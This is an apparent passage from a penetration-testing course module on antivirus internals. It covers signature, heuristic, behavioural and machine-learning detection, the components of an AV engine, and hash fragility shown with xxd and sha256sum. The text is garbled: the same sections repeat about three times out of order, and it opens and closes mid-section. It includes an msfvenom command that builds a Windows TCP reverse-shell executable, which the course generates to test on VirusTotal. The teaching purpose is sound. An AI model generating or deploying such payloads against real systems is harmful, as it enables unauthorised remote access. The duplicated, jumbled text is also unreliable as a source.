[_Heuristic-Based Detection_](https://en.wikipedia.org/wiki/Heuristic_analysis) is a detection method that relies on various rules and algorithms to determine if an action is considered malicious. This is often achieved by stepping through the instruction set of a binary file or by attempting to disassemble the machine code and ultimately decompile and analyze the source code to obtain a more comprehensive map of the program. The idea is to search for various patterns and program calls (as opposed to simple byte sequences) that are considered malicious.

Alternatively, [_Behavior-Based Detection_](https://pdfs.semanticscholar.org/08ec/24106e9218c3a65bc3e16dd88dea2693e933.pdf) dynamically analyzes the behavior of a binary file. This is often achieved by executing the file in question in an emulated environment, such as a small virtual machine, or sandbox,and searching for behaviors or actions that are considered malicious.

Lastly, _Machine-Learning Detection_ aims to up the game by introducing ML algorithms to detect unknown threats by collecting and [_analyzing additional metadata_](https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/cloud-protection-microsoft-antivirus-sample-submission?view=o365-worldwide). For instance, Microsoft Windows Defender has two ML components: the client ML engine, which is responsible for creating ML models and heuristics, and the cloud ML engine, which is capable of analyzing the submitted sample against a metadata-based model comprised of all the [_submitted samples_](https://i.blackhat.com/us-18/Thu-August-9/us-18-Parikh-Protecting-the-Protector-Hardening-Machine-Learning-Defenses-Against-Adversarial-Attacks.pdf). Whenever the client ML engine is unable to determine whether a program is benign or not, it will query the cloud ML counterpart for a final response.

Since these techniques do not require malware signatures, they can be used to identify unknown malware, or variations of known malware, more effectively. Given that antivirus manufacturers use different implementations when it comes to heuristics, behavior, and machine learning detection, each antivirus product will differ in terms of what code is considered malicious.

It's worth noting that many antivirus developers use a combination of these detection methods to achieve higher detection rates.

To demonstrate the effectiveness of various antivirus products, we will start by scanning a popular _Metasploit_ payload. Using _msfvenom_, we will generate a standard [_Portable Executable_](https://en.wikipedia.org/wiki/Portable_Executable) (PE) file containing our payload. In this case we will use a simple TCP reverse shell.

The PE file format is used on Windows operating systems for executable and object files. The PE format represents a Windows data structure that details the information necessary for the [_Windows Loader_](https://en.wikipedia.org/wiki/Loader_(computing)) to manage the wrapped executable code including required dynamic libraries, API import and export tables, etc.

Before generating any Metasploit payloads, it is a best practice to make sure we are running the latest version of Kali. Metasploit gets updated frequently and its AV signatures could change as well. AV vendors must rebuild those signatures and push them as updates. This constant and intrinsic delay in pushing new up-to-date signatures could give attackers an extra edge during a penetration test, since a fresh Metasploit version might run undetected due to stale AV signatures.

Let's generate the test binary payload by running the **msfvenom** command followed by the **\-p** argument specifying the payload. We'll then pass the reverse shell local host (**LHOST**) and local port (**LPORT**) arguments along with the **EXE** file format and redirect the output to a file named **binary.exe**.

```
kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f exe > binary.exe
...
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```

> Listing 5 - Generating a malicious PE containing a meterpreter shell.

Next, we will run a virus scan on this executable. Rather than installing many antivirus applications on our local machine, we can upload our file to [_VirusTotal_](https://www.virustotal.com/#/home/upload), which will scan it to determine the detection rate of various AV products.

VirusTotal is convenient, but it generates a hash along with storing the original file for each unique submission. The submitted files along with the metadata are then shared with all participating AV vendors. As such, take care when submitting sensitive payloads as the hash is considered public from the time of first submission.

The results of this scan are listed below.

![Figure 1: Virustotal results on the msfvenom payload.](https://static.offsec.com/offsec-courses/PEN-200/imgs/antivirus_evasion/9a05cfc8fe2cd0438b9b48b03c79ed23-antivirus_evasion_01b.png)

Figure 1: Virustotal results on the msfvenom payload.

We'll notice in our results that many antivirus products determined our file is malicious based on the different detection mechanisms we have illustrated in this section.

In this Learning Unit, we have explored the different components that constitute a modern AV and covered the various strategies adopted to detect malicious software.

In the next Learning Unit, we are going to make use of this knowledge and learn the different mechanisms that enable attackers to evade antivirus detections.

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Antivirus Evasion - AV Components and Operations - VM #1

#### Labs

1.  Which AV engine is responsible for translating machine code into assembly?

Answer

# 15\. Antivirus Evasion

In this Module, we will cover the following Learning Units:

-   Antivirus Software Key Components and Operations
-   Bypassing Antivirus Detections
-   Antivirus Evasion in Practice

To compromise a target machine, attackers often disable or otherwise bypass antivirus software installed on these systems. As penetration testers, we must understand and be able to recreate these techniques to demonstrate this potential threat to our client.

In this Module, we will discuss the purpose of antivirus software, discover how it works, and outline how it is deployed in most companies. We will examine various methods used to detect malicious software and explore some of the available tools and techniques that will allow us to bypass AV software on target machines.

## 15.1. Antivirus Software Key Components and Operations

This Learning Unit covers the following Learning Objectives:

-   Recognize Known vs Unknown Threats
-   Understand AV Key Components
-   Understand AV Detection Engines

[_Antivirus_](https://en.wikipedia.org/wiki/Antivirus_software) (AV), is a type of application designed to prevent, detect, and remove malicious software. It was originally designed to simply remove computer viruses. However, with the development of new types of malware, like bots and [_ransomware_](https://www.crowdstrike.com/cybersecurity-101/malware/types-of-malware/), antivirus software now typically includes additional protections such as [_IDS/IPS_](https://en.wikipedia.org/wiki/Intrusion_detection_system), firewall, website scanners, and more.

## 15.1.1. Known vs Unknown Threats

In its original design, an antivirus software bases its operation and decisions on signatures. The goal of a signature is to uniquely identify a specific piece of malware. Signatures can vary in terms of type and characteristics that can span from a very generic file hash summary to a more specific binary sequence match. As we'll discover in the following section, an AV comprises different engines responsible for detecting and analyzing specific components of the running system.

A signature language is often defined for each AV engine and thus, a signature can represent different aspects of a piece of malware, depending on the AV engine. For example, two signatures can be developed to contrast the exact same type of malware: one to target the malware file on disk and another to detect its network communication. The semantics of the two signatures can vary drastically as they are intended for two different AV engines. In 2014, a signature language named [_YARA_](https://en.wikipedia.org/wiki/YARA) was open-sourced to allow researchers to query the [_VirusTotal_](https://www.virustotal.com/#/home/upload) platform or even integrate their own malware signatures into AV products. VirusTotal is a malware search engine that allows users to search known malware or submit new samples and scan them against several AV products.

As signatures are written based on known threats, AV products could initially only detect and react based on malware that has already been vetted and documented. However, modern AV solutions, including [_Windows Defender_](https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/microsoft-defender-antivirus-windows?view=o365-worldwide), are shipped with a [_Machine Learning_](https://www.microsoft.com/security/blog/2017/08/03/windows-defender-atp-machine-learning-detecting-new-and-unusual-breach-activity/) (ML) engine that is queried whenever an unknown file is discovered on a system. These ML engines can detect unknown threats. Since ML engines operate on the cloud, they require an active connection to the internet, which is often not an option on internal enterprise servers. Moreover, the many engines that constitute an AV should not borrow too many computing resources from the rest of the system as it could impact the system's usability.

To overcome these AV limitations, [_Endpoint Detection and Response_](https://en.wikipedia.org/wiki/Endpoint_detection_and_response) (EDR) solutions have evolved during recent years. EDR software is responsible for generating security-event telemetry and forwarding it to a [_Security Information and Event Management_](https://en.wikipedia.org/wiki/Security_information_and_event_management) (SIEM) system, which collects data from every company host. These events are then rendered by the SIEM so that the security analyst team can gain a full overview of any past or ongoing attack affecting the organization.

Even though some EDR solutions include AV components, AVs and EDRs are not mutually exclusive as they complement each other with enhanced visibility and detection. Ultimately, their deployment should be evaluated based on an organization's internal network design and current security posture.

## 15.1.2. AV Engines and Components

At its core, a modern AV is fueled by signature updates fetched from the vendor's signature database that resides on the internet. Those signature definitions are stored in the local AV signature database, which in turn feeds the more specific engines.

A modern antivirus is typically designed around the following components:

-   File Engine
-   Memory Engine
-   Network Engine
-   Disassembler
-   Emulator/Sandbox
-   Browser Plugin
-   Machine Learning Engine

Each of the engines above work simultaneously with the signature database to rank specific events as either benign, malicious, or unknown.

The _file engine_ is responsible for both scheduled and real-time file scans. When the engine performs a scheduled scan, it simply parses the entire file system and sends each file's metadata or data to the signature engine. On the contrary, real-time scans involve detecting and possibly reacting to any new file action, such as downloading new malware from a website. To detect such operations, the real-time scanners need to identify events at the kernel level via a specially crafted [_mini-filter driver_](https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/filter-manager-concepts). This is the reason why a modern AV needs to operate both in kernel and user land, in order to validate the entire operating system scope.

The _memory engine_ inspects each process's memory space at runtime for well-known binary signatures or suspicious API calls that might result in memory injection attacks, as we'll find shortly.

As the name suggests, the _network engine_ inspects the incoming and outgoing network traffic on the local network interface. Once a signature is matched, a network engine might attempt to block the malware from communicating with its [_Command and Control_](https://en.wikipedia.org/wiki/Botnet#Command_and_control) (C2) server.

To further hinder detection, malware often employs encryption and decryption through custom routines to conceal its true nature. AVs counterattack this strategy by _disassembling_ the malware packers or ciphers and loading the malware into a sandbox, or _emulator_.

The _disassembler_ engine is responsible for translating machine code into assembly language, reconstructing the original program code section, and identifying any encoding/decoding routine. A _sandbox_ is a special isolated environment in the AV software where malware can be safely loaded and executed without causing potential havoc to the system. Once the malware is unpacked/decoded and running in the emulator, it can be thoroughly analyzed against any known signature.

As browsers are protected by the sandbox, modern AVs often employ browser plugins to get better visibility and detect malicious content that might be executed inside the browser.

Additionally, the machine learning component is becoming a vital part of current AVs as it enables detection of unknown threats by relying on cloud-enhanced computing resources and algorithms.

## 15.1.3. Detection Methods

As mentioned earlier, antivirus signature syntax and scope may differ based on the engine they have been built for, but they still serve the same purpose of uniquely identifying a specific threat or malware.

In this section, we are going to explore the following AV detection methodologies and explain how they work together.

-   Signature-based Detection
-   Heuristic-based Detection
-   Behavioral Detection
-   Machine Learning Detection

_Signature-based_ antivirus detection is mostly considered a _restricted list technology_. In other words, the filesystem is scanned for known malware signatures and if any are detected, the offending files are quarantined.

A signature can be just as simple as the hash of the file itself or a set of multiple patterns, such as specific binary values and strings that should belong only to that specific malware.

Relying on just the file hash as the only detection mechanism is a weak strategy because changing a single bit from the file would result in a completely different hash.

As an example, we created a text file on our local Kali machine that contains the string "offsec". Let's dump its binary representation via the [_xxd_](https://linux.die.net/man/1/xxd) tool by passing the **\-b** argument before the file name.

```
kali@kali:~$ xxd -b malware.txt
00000000: 01101111 01100110 01100110 01110011 01100101 01100011  offsec
00000006: 00001010                                               .
```

> Listing 1 - Inspecting the binary file content with xxd

We displayed the content of the file through the xxd utility. The output shows the binary offset on the leftmost column, the actual binary representation in the middle column, and the ASCII translation on the rightmost one. We have also highlighted the binary representation of the letter "c" in red. Its purpose will become clear shortly.

Now, assuming this is real malware, we want to calculate the hash of the file, and we can do so through the **sha256sum** utility.

```
kali@kali:~$ sha256sum malware.txt
c361ec96c8f2ffd45e8a990c41cfba4e8a53a09e97c40598a0ba2383ff63510e  malware.txt
```

> Listing 2 - Calculating the SHA256 hash of the file

Let's now replace the last letter of the "offsec" string with a capital **C** and dump its binary value via xxd once more.

```
kali@kali:~$ xxd -b malware.txt
00000000: 01101111 01100110 01100110 01110011 01100101 01000011  offseC
00000006: 00001010
```

> Listing 3 - Inspecting the file content with xxd

In listing 3, we notice that the binary value of the last letter is changed only in its third bit from the left.

Since every hashing algorithm is supposed to produce a totally different hash even if only one bit has changed, let's calculate the SHA256 hash on the modified string.

```
kali@kali:~$ sha256sum malware.txt
15d0fa07f0db56f27bcc8a784c1f76a8bf1074b3ae697cf12acf73742a0cc37c  malware.txt
```

> Listing 4 - Calculating the SHA256 hash on the modified file

Unsurprisingly, the hash value has fully changed, which proves the fragility of relying solely on hash file signature detections.

To address the pitfalls of signature-based detection, antivirus manufacturers introduced additional detection methods to improve the effectiveness of their products.

[_Heuristic-Based Detection_](https://en.wikipedia.org/wiki/Heuristic_analysis) is a detection method that relies on various rules and algorithms to determine if an action is considered malicious. This is often achieved by stepping through the instruction set of a binary file or by attempting to disassemble the machine code and ultimately decompile and analyze the source code to obtain a more comprehensive map of the program. The idea is to search for various patterns and program calls (as opposed to simple byte sequences) that are considered malicious.

Alternatively, [_Behavior-Based Detection_](https://pdfs.semanticscholar.org/08ec/24106e9218c3a65bc3e16dd88dea2693e933.pdf) dynamically analyzes the behavior of a binary file. This is often achieved by executing the file in question in an emulated environment, such as a small virtual machine, or sandbox,and searching for behaviors or actions that are considered malicious.

Lastly, _Machine-Learning Detection_ aims to up the game by introducing ML algorithms to detect unknown threats by collecting and [_analyzing additional metadata_](https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/cloud-protection-microsoft-antivirus-sample-submission?view=o365-worldwide). For instance, Microsoft Windows Defender has two ML components: the client ML engine, which is responsible for creating ML models and heuristics, and the cloud ML engine, which is capable of analyzing the submitted sample against a metadata-based model comprised of all the [_submitted samples_](https://i.blackhat.com/us-18/Thu-August-9/us-18-Parikh-Protecting-the-Protector-Hardening-Machine-Learning-Defenses-Against-Adversarial-Attacks.pdf). Whenever the client ML engine is unable to determine whether a program is benign or not, it will query the cloud ML counterpart for a final response.

Since these techniques do not require malware signatures, they can be used to identify unknown malware, or variations of known malware, more effectively. Given that antivirus manufacturers use different implementations when it comes to heuristics, behavior, and machine learning detection, each antivirus product will differ in terms of what code is considered malicious.

It's worth noting that many antivirus developers use a combination of these detection methods to achieve higher detection rates.

To demonstrate the effectiveness of various antivirus products, we will start by scanning a popular _Metasploit_ payload. Using _msfvenom_, we will generate a standard [_Portable Executable_](https://en.wikipedia.org/wiki/Portable_Executable) (PE) file containing our payload. In this case we will use a simple TCP reverse shell.

The PE file format is used on Windows operating systems for executable and object files. The PE format represents a Windows data structure that details the information necessary for the [_Windows Loader_](https://en.wikipedia.org/wiki/Loader_(computing)) to manage the wrapped executable code including required dynamic libraries, API import and export tables, etc.

Before generating any Metasploit payloads, it is a best practice to make sure we are running the latest version of Kali. Metasploit gets updated frequently and its AV signatures could change as well. AV vendors must rebuild those signatures and push them as updates. This constant and intrinsic delay in pushing new up-to-date signatures could give attackers an extra edge during a penetration test, since a fresh Metasploit version might run undetected due to stale AV signatures.

Let's generate the test binary payload by running the **msfvenom** command followed by the **\-p** argument specifying the payload. We'll then pass the reverse shell local host (**LHOST**) and local port (**LPORT**) arguments along with the **EXE** file format and redirect the output to a file named **binary.exe**.

```
kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f exe > binary.exe
...
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```

> Listing 5 - Generating a malicious PE containing a meterpreter shell.

Next, we will run a virus scan on this executable. Rather than installing many antivirus applications on our local machine, we can upload our file to [_VirusTotal_](https://www.virustotal.com/#/home/upload), which will scan it to determine the detection rate of various AV products.

VirusTotal is convenient, but it generates a hash along with storing the original file for each unique submission. The submitted files along with the metadata are then shared with all participating AV vendors. As such, take care when submitting sensitive payloads as the hash is considered public from the time of first submission.

The results of this scan are listed below.

![Figure 1: Virustotal results on the msfvenom payload.](https://static.offsec.com/offsec-courses/PEN-200/imgs/antivirus_evasion/9a05cfc8fe2cd0438b9b48b03c79ed23-antivirus_evasion_01b.png)

Figure 1: Virustotal results on the msfvenom payload.

We'll notice in our results that many antivirus products determined our file is malicious based on the different detection mechanisms we have illustrated in this section.

In this Learning Unit, we have explored the different components that constitute a modern AV and covered the various strategies adopted to detect malicious software.

In the next Learning Unit, we are going to make use of this knowledge and learn the different mechanisms that enable attackers to evade antivirus detections.

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Antivirus Evasion - AV Components and Operations - VM #1

#### Labs

1.  Which AV engine is responsible for translating machine code into assembly?

Answer

# 15\. Antivirus Evasion

In this Module, we will cover the following Learning Units:

-   Antivirus Software Key Components and Operations
-   Bypassing Antivirus Detections
-   Antivirus Evasion in Practice

To compromise a target machine, attackers often disable or otherwise bypass antivirus software installed on these systems. As penetration testers, we must understand and be able to recreate these techniques to demonstrate this potential threat to our client.

In this Module, we will discuss the purpose of antivirus software, discover how it works, and outline how it is deployed in most companies. We will examine various methods used to detect malicious software and explore some of the available tools and techniques that will allow us to bypass AV software on target machines.

## 15.1. Antivirus Software Key Components and Operations

This Learning Unit covers the following Learning Objectives:

-   Recognize Known vs Unknown Threats
-   Understand AV Key Components
-   Understand AV Detection Engines

[_Antivirus_](https://en.wikipedia.org/wiki/Antivirus_software) (AV), is a type of application designed to prevent, detect, and remove malicious software. It was originally designed to simply remove computer viruses. However, with the development of new types of malware, like bots and [_ransomware_](https://www.crowdstrike.com/cybersecurity-101/malware/types-of-malware/), antivirus software now typically includes additional protections such as [_IDS/IPS_](https://en.wikipedia.org/wiki/Intrusion_detection_system), firewall, website scanners, and more.

## 15.1.1. Known vs Unknown Threats

In its original design, an antivirus software bases its operation and decisions on signatures. The goal of a signature is to uniquely identify a specific piece of malware. Signatures can vary in terms of type and characteristics that can span from a very generic file hash summary to a more specific binary sequence match. As we'll discover in the following section, an AV comprises different engines responsible for detecting and analyzing specific components of the running system.

A signature language is often defined for each AV engine and thus, a signature can represent different aspects of a piece of malware, depending on the AV engine. For example, two signatures can be developed to contrast the exact same type of malware: one to target the malware file on disk and another to detect its network communication. The semantics of the two signatures can vary drastically as they are intended for two different AV engines. In 2014, a signature language named [_YARA_](https://en.wikipedia.org/wiki/YARA) was open-sourced to allow researchers to query the [_VirusTotal_](https://www.virustotal.com/#/home/upload) platform or even integrate their own malware signatures into AV products. VirusTotal is a malware search engine that allows users to search known malware or submit new samples and scan them against several AV products.

As signatures are written based on known threats, AV products could initially only detect and react based on malware that has already been vetted and documented. However, modern AV solutions, including [_Windows Defender_](https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/microsoft-defender-antivirus-windows?view=o365-worldwide), are shipped with a [_Machine Learning_](https://www.microsoft.com/security/blog/2017/08/03/windows-defender-atp-machine-learning-detecting-new-and-unusual-breach-activity/) (ML) engine that is queried whenever an unknown file is discovered on a system. These ML engines can detect unknown threats. Since ML engines operate on the cloud, they require an active connection to the internet, which is often not an option on internal enterprise servers. Moreover, the many engines that constitute an AV should not borrow too many computing resources from the rest of the system as it could impact the system's usability.

To overcome these AV limitations, [_Endpoint Detection and Response_](https://en.wikipedia.org/wiki/Endpoint_detection_and_response) (EDR) solutions have evolved during recent years. EDR software is responsible for generating security-event telemetry and forwarding it to a [_Security Information and Event Management_](https://en.wikipedia.org/wiki/Security_information_and_event_management) (SIEM) system, which collects data from every company host. These events are then rendered by the SIEM so that the security analyst team can gain a full overview of any past or ongoing attack affecting the organization.

Even though some EDR solutions include AV components, AVs and EDRs are not mutually exclusive as they complement each other with enhanced visibility and detection. Ultimately, their deployment should be evaluated based on an organization's internal network design and current security posture.

## 15.1.2. AV Engines and Components

At its core, a modern AV is fueled by signature updates fetched from the vendor's signature database that resides on the internet. Those signature definitions are stored in the local AV signature database, which in turn feeds the more specific engines.

A modern antivirus is typically designed around the following components:

-   File Engine
-   Memory Engine
-   Network Engine
-   Disassembler
-   Emulator/Sandbox
-   Browser Plugin
-   Machine Learning Engine

Each of the engines above work simultaneously with the signature database to rank specific events as either benign, malicious, or unknown.

The _file engine_ is responsible for both scheduled and real-time file scans. When the engine performs a scheduled scan, it simply parses the entire file system and sends each file's metadata or data to the signature engine. On the contrary, real-time scans involve detecting and possibly reacting to any new file action, such as downloading new malware from a website. To detect such operations, the real-time scanners need to identify events at the kernel level via a specially crafted [_mini-filter driver_](https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/filter-manager-concepts). This is the reason why a modern AV needs to operate both in kernel and user land, in order to validate the entire operating system scope.

The _memory engine_ inspects each process's memory space at runtime for well-known binary signatures or suspicious API calls that might result in memory injection attacks, as we'll find shortly.

As the name suggests, the _network engine_ inspects the incoming and outgoing network traffic on the local network interface. Once a signature is matched, a network engine might attempt to block the malware from communicating with its [_Command and Control_](https://en.wikipedia.org/wiki/Botnet#Command_and_control) (C2) server.

To further hinder detection, malware often employs encryption and decryption through custom routines to conceal its true nature. AVs counterattack this strategy by _disassembling_ the malware packers or ciphers and loading the malware into a sandbox, or _emulator_.

The _disassembler_ engine is responsible for translating machine code into assembly language, reconstructing the original program code section, and identifying any encoding/decoding routine. A _sandbox_ is a special isolated environment in the AV software where malware can be safely loaded and executed without causing potential havoc to the system. Once the malware is unpacked/decoded and running in the emulator, it can be thoroughly analyzed against any known signature.

As browsers are protected by the sandbox, modern AVs often employ browser plugins to get better visibility and detect malicious content that might be executed inside the browser.

Additionally, the machine learning component is becoming a vital part of current AVs as it enables detection of unknown threats by relying on cloud-enhanced computing resources and algorithms.

## 15.1.3. Detection Methods

As mentioned earlier, antivirus signature syntax and scope may differ based on the engine they have been built for, but they still serve the same purpose of uniquely identifying a specific threat or malware.

In this section, we are going to explore the following AV detection methodologies and explain how they work together.

-   Signature-based Detection
-   Heuristic-based Detection
-   Behavioral Detection
-   Machine Learning Detection

_Signature-based_ antivirus detection is mostly considered a _restricted list technology_. In other words, the filesystem is scanned for known malware signatures and if any are detected, the offending files are quarantined.

A signature can be just as simple as the hash of the file itself or a set of multiple patterns, such as specific binary values and strings that should belong only to that specific malware.

Relying on just the file hash as the only detection mechanism is a weak strategy because changing a single bit from the file would result in a completely different hash.

As an example, we created a text file on our local Kali machine that contains the string "offsec". Let's dump its binary representation via the [_xxd_](https://linux.die.net/man/1/xxd) tool by passing the **\-b** argument before the file name.

```
kali@kali:~$ xxd -b malware.txt
00000000: 01101111 01100110 01100110 01110011 01100101 01100011  offsec
00000006: 00001010                                               .
```

> Listing 1 - Inspecting the binary file content with xxd

We displayed the content of the file through the xxd utility. The output shows the binary offset on the leftmost column, the actual binary representation in the middle column, and the ASCII translation on the rightmost one. We have also highlighted the binary representation of the letter "c" in red. Its purpose will become clear shortly.

Now, assuming this is real malware, we want to calculate the hash of the file, and we can do so through the **sha256sum** utility.

```
kali@kali:~$ sha256sum malware.txt
c361ec96c8f2ffd45e8a990c41cfba4e8a53a09e97c40598a0ba2383ff63510e  malware.txt
```

> Listing 2 - Calculating the SHA256 hash of the file

Let's now replace the last letter of the "offsec" string with a capital **C** and dump its binary value via xxd once more.

```
kali@kali:~$ xxd -b malware.txt
00000000: 01101111 01100110 01100110 01110011 01100101 01000011  offseC
00000006: 00001010
```

> Listing 3 - Inspecting the file content with xxd

In listing 3, we notice that the binary value of the last letter is changed only in its third bit from the left.

Since every hashing algorithm is supposed to produce a totally different hash even if only one bit has changed, let's calculate the SHA256 hash on the modified string.

```
kali@kali:~$ sha256sum malware.txt
15d0fa07f0db56f27bcc8a784c1f76a8bf1074b3ae697cf12acf73742a0cc37c  malware.txt
```

> Listing 4 - Calculating the SHA256 hash on the modified file

Unsurprisingly, the hash value has fully changed, which proves the fragility of relying solely on hash file signature detections.

To address the pitfalls of signature-based detection, antivirus manufacturers introduced additional detection methods to improve the effectiveness of their products.

[_Heuristic-Based Detection_](https://en.wikipedia.org/wiki/Heuristic_analysis) is a detection method that relies on various rules and algorithms to determine if an action is considered malicious. This is often achieved by stepping through the instruction set of a binary file or by attempting to disassemble the machine code and ultimately decompile and analyze the source code to obtain a more comprehensive map of the program. The idea is to search for various patterns and program calls (as opposed to simple byte sequences) that are considered malicious.

Alternatively, [_Behavior-Based Detection_](https://pdfs.semanticscholar.org/08ec/24106e9218c3a65bc3e16dd88dea2693e933.pdf) dynamically analyzes the behavior of a binary file. This is often achieved by executing the file in question in an emulated environment, such as a small virtual machine, or sandbox,and searching for behaviors or actions that are considered malicious.

Lastly, _Machine-Learning Detection_ aims to up the game by introducing ML algorithms to detect unknown threats by collecting and [_analyzing additional metadata_](https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/cloud-protection-microsoft-antivirus-sample-submission?view=o365-worldwide). For instance, Microsoft Windows Defender has two ML components: the client ML engine, which is responsible for creating ML models and heuristics, and the cloud ML engine, which is capable of analyzing the submitted sample against a metadata-based model comprised of all the [_submitted samples_](https://i.blackhat.com/us-18/Thu-August-9/us-18-Parikh-Protecting-the-Protector-Hardening-Machine-Learning-Defenses-Against-Adversarial-Attacks.pdf). Whenever the client ML engine is unable to determine whether a program is benign or not, it will query the cloud ML counterpart for a final response.

Since these techniques do not require malware signatures, they can be used to identify unknown malware, or variations of known malware, more effectively. Given that antivirus manufacturers use different implementations when it comes to heuristics, behavior, and machine learning detection, each antivirus product will differ in terms of what code is considered malicious.

It's worth noting that many antivirus developers use a combination of these detection methods to achieve higher detection rates.

To demonstrate the effectiveness of various antivirus products, we will start by scanning a popular _Metasploit_ payload. Using _msfvenom_, we will generate a standard [_Portable Executable_](https://en.wikipedia.org/wiki/Portable_Executable) (PE) file containing our payload. In this case we will use a simple TCP reverse shell.

The PE file format is used on Windows operating systems for executable and object files. The PE format represents a Windows data structure that details the information necessary for the [_Windows Loader_](https://en.wikipedia.org/wiki/Loader_(computing)) to manage the wrapped executable code including required dynamic libraries, API import and export tables, etc.

Before generating any Metasploit payloads, it is a best practice to make sure we are running the latest version of Kali. Metasploit gets updated frequently and its AV signatures could change as well. AV vendors must rebuild those signatures and push them as updates. This constant and intrinsic delay in pushing new up-to-date signatures could give attackers an extra edge during a penetration test, since a fresh Metasploit version might run undetected due to stale AV signatures.

Let's generate the test binary payload by running the **msfvenom** command followed by the **\-p** argument specifying the payload. We'll then pass the reverse shell local host (**LHOST**) and local port (**LPORT**) arguments along with the **EXE** file format and redirect the output to a file named **binary.exe**.

```
kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f exe > binary.exe
...
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```

> Listing 5 - Generating a malicious PE containing a meterpreter shell.

Next, we will run a virus scan on this executable. Rather than installing many antivirus applications on our local machine, we can upload our file to [_VirusTotal_](https://www.virustotal.com/#/home/upload), which will scan it to determine the detection rate of various AV products.

VirusTotal is convenient, but it generates a hash along with storing the original file for each unique submission. The submitted files along with the metadata are then shared with all participating AV vendors. As such, take care when submitting sensitive payloads as the hash is considered public from the time of first submission.

The results of this scan are listed below.

![Figure 1: Virustotal results on the msfvenom payload.](https://static.offsec.com/offsec-courses/PEN-200/imgs/antivirus_evasion/9a05cfc8fe2cd0438b9b48b03c79ed23-antivirus_evasion_01b.png)

Figure 1: Virustotal results on the msfvenom payload.

We'll notice in our results that many antivirus products determined our file is malicious based on the different detection mechanisms we have illustrated in this section.

In this Learning Unit, we have explored the different components that constitute a modern AV and covered the various strategies adopted to detect malicious software.

In the next Learning Unit, we are going to make use of this knowledge and learn the different mechanisms that enable attackers to evade antivirus detections.

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Antivirus Evasion - AV Components and Operations - VM #1

#### Labs

1.  Which AV engine is responsible for translating machine code into assembly?

Answer

# 15\. Antivirus Evasion

In this Module, we will cover the following Learning Units:

-   Antivirus Software Key Components and Operations
-   Bypassing Antivirus Detections
-   Antivirus Evasion in Practice

To compromise a target machine, attackers often disable or otherwise bypass antivirus software installed on these systems. As penetration testers, we must understand and be able to recreate these techniques to demonstrate this potential threat to our client.

In this Module, we will discuss the purpose of antivirus software, discover how it works, and outline how it is deployed in most companies. We will examine various methods used to detect malicious software and explore some of the available tools and techniques that will allow us to bypass AV software on target machines.

## 15.1. Antivirus Software Key Components and Operations

This Learning Unit covers the following Learning Objectives:

-   Recognize Known vs Unknown Threats
-   Understand AV Key Components
-   Understand AV Detection Engines

[_Antivirus_](https://en.wikipedia.org/wiki/Antivirus_software) (AV), is a type of application designed to prevent, detect, and remove malicious software. It was originally designed to simply remove computer viruses. However, with the development of new types of malware, like bots and [_ransomware_](https://www.crowdstrike.com/cybersecurity-101/malware/types-of-malware/), antivirus software now typically includes additional protections such as [_IDS/IPS_](https://en.wikipedia.org/wiki/Intrusion_detection_system), firewall, website scanners, and more.

## 15.1.1. Known vs Unknown Threats

In its original design, an antivirus software bases its operation and decisions on signatures. The goal of a signature is to uniquely identify a specific piece of malware. Signatures can vary in terms of type and characteristics that can span from a very generic file hash summary to a more specific binary sequence match. As we'll discover in the following section, an AV comprises different engines responsible for detecting and analyzing specific components of the running system.

A signature language is often defined for each AV engine and thus, a signature can represent different aspects of a piece of malware, depending on the AV engine. For example, two signatures can be developed to contrast the exact same type of malware: one to target the malware file on disk and another to detect its network communication. The semantics of the two signatures can vary drastically as they are intended for two different AV engines. In 2014, a signature language named [_YARA_](https://en.wikipedia.org/wiki/YARA) was open-sourced to allow researchers to query the [_VirusTotal_](https://www.virustotal.com/#/home/upload) platform or even integrate their own malware signatures into AV products. VirusTotal is a malware search engine that allows users to search known malware or submit new samples and scan them against several AV products.

As signatures are written based on known threats, AV products could initially only detect and react based on malware that has already been vetted and documented. However, modern AV solutions, including [_Windows Defender_](https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/microsoft-defender-antivirus-windows?view=o365-worldwide), are shipped with a [_Machine Learning_](https://www.microsoft.com/security/blog/2017/08/03/windows-defender-atp-machine-learning-detecting-new-and-unusual-breach-activity/) (ML) engine that is queried whenever an unknown file is discovered on a system. These ML engines can detect unknown threats. Since ML engines operate on the cloud, they require an active connection to the internet, which is often not an option on internal enterprise servers. Moreover, the many engines that constitute an AV should not borrow too many computing resources from the rest of the system as it could impact the system's usability.

To overcome these AV limitations, [_Endpoint Detection and Response_](https://en.wikipedia.org/wiki/Endpoint_detection_and_response) (EDR) solutions have evolved during recent years. EDR software is responsible for generating security-event telemetry and forwarding it to a [_Security Information and Event Management_](https://en.wikipedia.org/wiki/Security_information_and_event_management) (SIEM) system, which collects data from every company host. These events are then rendered by the SIEM so that the security analyst team can gain a full overview of any past or ongoing attack affecting the organization.

Even though some EDR solutions include AV components, AVs and EDRs are not mutually exclusive as they complement each other with enhanced visibility and detection. Ultimately, their deployment should be evaluated based on an organization's internal network design and current security posture.

## 15.1.2. AV Engines and Components

